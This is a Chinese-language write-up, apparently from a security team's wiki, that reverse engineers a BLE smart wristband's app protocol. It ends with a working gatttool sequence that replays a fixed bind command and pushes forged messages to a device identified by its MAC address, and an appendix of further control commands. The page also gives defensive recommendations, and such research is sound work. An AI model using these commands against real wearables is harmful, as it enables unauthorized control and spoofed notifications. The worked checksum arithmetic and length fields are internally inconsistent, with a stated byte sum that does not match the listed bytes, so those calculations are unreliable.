---
title: BLE智能手环协议分析与任意消息推送攻击实战
description: 完整复现某款BLE智能手环从抓包、APP逆向到协议重构并实现任意消息推送的实战案例，涵盖CC2540抓包、AndroidKiller动态分析、jadx静态逆向、gatttool交互验证全流程
category: program-analysis
tags:
- BLE
- Bluetooth Low Energy
- 智能手环
- 协议逆向
- 抓包分析
- Android逆向
- CC2540
- gatttool
- 任意消息推送
- 1024安全团队
date: 2023-04-15
updated: '2026-11-15'
---

## 概述

本页面记录 1024安全团队对市面某款 BLE 智能手环的完整安全分析实战过程。从蓝牙数据包捕获、移动端 APP 动态日志分析、静态逆向工程到协议结构重构，最终利用 `gatttool` 实现未授权的任意消息推送攻击。该案例展示了 IoT 设备在配对绑定机制、通信协议校验、命令下发接口等方面的典型安全缺陷。

## 实验环境与工具链

| 类别 | 工具/设备 | 说明 |
|------|-----------|------|
| **硬件抓包** | TI CC2540 + Packet Sniffer | 单信道监听，需多次尝试覆盖 37/38/39 广播信道 |
| **动态分析** | AndroidKiller | 实时捕获 Android 系统日志，定位 BLE 交互指令 |
| **静态逆向** | jadx | 反编译 APK，定位 `CmdHelper.setMessage2` 等核心逻辑 |
| **协议验证** | gatttool (bluez) | Linux 下 BLE 交互命令行工具，支持特征读写 |
| **目标设备** | 某款智能手环 | MAC: `A4:C1:38:6A:1C:BF` |

> 相关硬件选型对比可参考 [[ble-packet-capture-comparison]]，nRF Sniffer 替代方案见 [[nrf-sniffer-ble-setup-guide]]，社团硬件清单见 [[0w1club-hardware-atlas]]。

## 攻击链复现全流程

### 设备发现与 MAC 地址确认

使用官方 APP 扫描连接目标手环，连接成功后即可获取设备 MAC 地址：

```
A4:C1:38:6A:1C:BF
```

### 空口抓包与关键帧识别

解除绑定后，使用 TI CC2540 Packet Sniffer 进行空口抓包。因 BLE 广播信道随机跳频（37/38/39），需多次尝试才能完整捕获绑定与通信过程。

**关键观测帧：**

| 方向 | 数据片段 | 推测功能 |
|------|----------|----------|
| M→S | 含 `0x64` (100步) | 步数查询请求 |
| S→M | 含 `0x64` | 步数响应 |
| M→S | `1008000000000001000000c00000000000000000` | 查找手环（触发震动） |

> 抓包阶段发现：未绑定状态下直接通过 `gatttool`/`nRF Connect` 发送指令无响应，确认设备实施了**绑定后通信**的访问控制。

### APP 动态日志分析（AndroidKiller）

通过 AndroidKiller 实时捕获 `logcat`，梳理出完整的指令交互序列：

| 操作阶段 | 捕获指令 (Hex) | 功能推测 |
|----------|----------------|----------|
| BLE 扫描 | — | 设备发现 |
| BLE 连接 | — | 建立 ATT 连接 |
| **绑定认证** | `43 00 00 dc` | **绑定命令（关键）** |
| 同步配置 | `01 00 00 0b` | `getDeviceInfo` |
| 同步状态 | `02 00 00 06` | `getDeviceState` |
| 读电量 | `27 00 00 74` | 电池电量查询 |
| 读运动数据 | `20 01 00 00 70` | 步数/卡路里/距离 |
| 读心率 | `21 01 00 00 c6` | 心率数据 |
| 读体温 | `2c 01 00 00 78` | 体温数据 |
| 查找手环 | `10 08 00 00 00 00 00 01 00 00 00 c0 00 00 00 00 00 00 00 00` | 触发 3 次长震动 |
| **消息推送** | 见下节详细分析 | **核心攻击面** |

> Android 逆向工程基础可参考 [[android-shelling-unshelling-techniques]]。

### 消息推送协议深度逆向（jadx 静态分析）

#### 关键代码定位

日志 Tag 指向 `CmdHelper.java`，反编译定位至：

```
com.runmifit.android.util.ble.CmdHelper.setMessage2(int, String)
```

调用方：`IntelligentNotificationService` 中两处调用，参数 `i` 分别为 `1`（昵称）和 `2`（消息内容）。

#### 协议构造逻辑还原

`setMessage2` 核心构造流程：

```java
// 伪代码还原
byte[] build(int type, String text) {
    byte[] msgBytes = text.getBytes("ASCII");
    int len = msgBytes.length + 1;           // +1 for type byte
    byte[] frame = new byte[len + 5];        // 头(1) + 长度(2) + type(1) + payload + checksum(1)
    
    frame[0] = 0x0A;                         // 固定帧头
    frame[1] = (byte)(len + 1);              // 长度低字节 (含校验位)
    frame[2] = (byte)((len + 1) >> 8);       // 长度高字节
    frame[3] = (byte)type;                   // 0x01=昵称, 0x02=消息
    
    System.arraycopy(msgBytes, 0, frame, 4, msgBytes.length);
    
    frame[frame.length - 1] = completeCheckCode(frame, frame.length - 1);
    return frame;
}

byte completeCheckCode(byte[] data, int len) {
    int sum = 0;
    for (int i = 0; i < len; i++) sum += data[i] & 0xFF;
    return (byte)((sum * 86 + 90) & 0xFF);   // 校验算法：sum*86+90 取低字节
}
```

#### 协议字段结构表

| 偏移 | 长度 | 字段 | 说明 |
|------|------|------|------|
| 0 | 1 | `0x0A` | 帧头标识 |
| 1-2 | 2 | Length | 数据区长度(含 type+payload+checksum)，小端序 |
| 3 | 1 | Type | `0x01`=发送人昵称, `0x02`=消息内容 |
| 4..N | N | Payload | ASCII 明文 |
| N+1 | 1 | Checksum | `((Σbytes)*86 + 90) & 0xFF` |

#### 完整消息序列

APP 推送消息时的四阶段指令：

| 阶段 | 指令示例 | 说明 |
|------|----------|------|
| 1. 开始推送 | `0A 02 00 00 02 0E` | 通知手环准备接收消息 |
| 2. 发送昵称 | `0A 05 00 01 74 65 73 74 3A` | "test:" (type=0x01) |
| 3. 发送内容 | `0A 05 00 02 31 32 33 34` | "1234" (type=0x02) |
| 4. 结束推送 | `0A 01 00 03 0E` | 通知手环显示 |

### 攻击载荷构造实例

**目标：** 伪造发送人 `sec` 发送消息 `hacked`

#### 昵称帧构造

- Payload: `73 65 63` ("sec")
- 长度计算: `3 + 1 = 4` → `0x04 0x00` (小端)
- 校验计算:  
  `Sum = 0x0A + 0x04 + 0x00 + 0x01 + 0x73 + 0x65 + 0x63 = 0x14A (330)`  
  `Checksum = (330 * 86 + 90) & 0xFF = 28470 & 0xFF = 0x36`
- **完整帧:** `0A 04 00 01 73 65 63 36`

#### 消息帧构造

- Payload: `68 61 63 6B 65 64` ("hacked")
- 长度: `6 + 1 = 7` → `0x07 0x00`
- 校验计算:  
  `Sum = 0x0A + 0x07 + 0x00 + 0x02 + 0x68+0x61+0x63+0x6B+0x65+0x64 = 0x2FC (764)`  
  `Checksum = (764 * 86 + 90) & 0xFF = 65794 & 0xFF = 0xFC`
- **完整帧:** `0A 07 00 02 68 61 63 6B 65 64 FC`

### 实战验证

```bash
# 激活蓝牙适配器
hciconfig hci0 up

# 进入 gatttool 交互模式
gatttool -I -b A4:C1:38:6A:1C:BF

# 连接设备
[ ] connect

# 查看特征值句柄
[ ] characteristics
# 目标写入句柄: 0x11

# 1. 发送绑定命令 (必须先绑定)
char-write-cmd 0x11 430000dc

# 2. 发送消息推送序列
char-write-cmd 0x11 0a020000020e        # 开始
char-write-cmd 0x11 0a04000173656336    # 昵称 "sec"
char-write-cmd 0x11 0a0700026861636b6564fc  # 内容 "hacked"
char-write-cmd 0x11 0a0100030e          # 结束显示
```

**结果：** 手环成功显示伪造消息 `sec: hacked`，攻击验证通过。

## 附录：其他功能指令集

| 功能 | 指令 | 备注 |
|------|------|------|
| 开启消息推送 | `02 10 00 32 05 00 01 00 01 01 00 01 FF 00 00 00 00 00 00 E2` |  |
| 关闭消息推送 | `02 10 00 32 05 00 01 00 01 01 00 00 FF 00 00 00 00 00 00 8C` |  |
| 查找手环(震动) | `10 08 00 00 00 00 00 01 00 00 00 C0 00 00 00 00 00 00 00 00` | 触发 3 次长震动 |
| 读取步数 | `20 01 00 00 70` |  |
| 读取心率 | `21 01 00 00 C6` |  |
| 读取电量 | `27 00 00 74` |  |

## 安全启示与防御建议

1. **绑定机制薄弱**：仅靠一条固定指令 `43 00 00 DC` 完成绑定，无加密认证、无随机数挑战，易被重放。
2. **协议无完整性保护**：校验算法为简单线性校验 (`sum*86+90`)，无 MAC/签名，攻击者可任意构造合法帧。
3. **命令无授权控制**：绑定后任意客户端可下发消息推送、查找手环、读取传感器数据等敏感命令。
4. **明文传输**：所有载荷均为 ASCII 明文，无加密，空口可被窃听/篡改。

**建议修复方向：**
- 引入基于 ECDH 的配对密钥协商，建立会话加密通道 (LE Secure Connections)
- 命令层面增加序列号 + HMAC 防重放与完整性校验
- 敏感操作 (消息推送、震动) 要求用户在手环侧确认
- 固件升级支持 OTA 签名验证，防止固件植入后门

## 交叉引用与延伸阅读

- [[ble-packet-capture-comparison]] — BLE 抓包硬件方案横向对比 (Ubertooth One / CC2540 / Hollong / nRF Sniffer)
- [[nrf-sniffer-ble-setup-guide]] — nRF Sniffer + Wireshark 环境搭建与配对解密实操
- [[0w1club-hardware-atlas]] — 0w1Club 社团硬件清单，含 CC2540、Ubertooth One 租借规则
- [[android-shelling-unshelling-techniques]] — Android 加固/脱壳技术演进，辅助更复杂 APP 的逆向分析
- [[iot-reconnaissance-information-gathering]] — IoT 设备信息收集与攻击面测绘方法论

## 参考来源

> 原文：1024安全团队微信公众号《对某款智能手环的分析与攻击》  
> 链接：http://mp.weixin.qq.com/s?__biz=MzkwMzM0NTg0OA==&mid=2247484630&idx=1&sn=cab11caf3dc258359f729880a5ef3ee7  
> 日期：2023-04-15 (约)

## 来源

- [1024安全团队-202204-202209_2](../sources/1024安全团队-202204-202209_2.md)
